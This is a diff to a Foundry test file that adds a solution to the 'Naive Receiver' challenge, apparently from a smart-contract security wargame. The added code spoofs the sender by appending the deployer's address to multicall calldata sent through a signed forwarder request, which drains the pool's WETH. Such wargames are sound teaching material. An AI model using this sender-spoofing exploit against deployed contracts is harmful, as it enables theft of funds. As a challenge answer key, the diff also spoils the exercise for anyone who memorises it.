@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import {Solution} from "./Solution.sol";
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -77,7 +78,33 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        bytes[] memory multicallData = new bytes[](1);
+        // withdraw from the deployer address
+        // the pool gets the address as last 20 bytes in calldata
+        multicallData[0] = bytes.concat(
+            abi.encodeWithSelector(pool.withdraw.selector, WETH_IN_POOL + WETH_IN_RECEIVER, recovery),
+            bytes20(deployer)
+        );
+        // use multicall, because the forwarder uses request.from as a last 20 bytes
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 10000000,
+            nonce: 0,
+            data: abi.encodeWithSelector(pool.multicall.selector, multicallData),
+            deadline: block.timestamp + 1
+        });
+
+        bytes32 digest = keccak256(bytes.concat(
+            "\x19\x01",
+            forwarder.domainSeparator(),
+            forwarder.getDataHash(request)
+        ));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = bytes.concat(r, s, bytes1(v));
+
+        new Solution(pool, weth, forwarder, address(receiver), request, signature);
     }
 
     /**
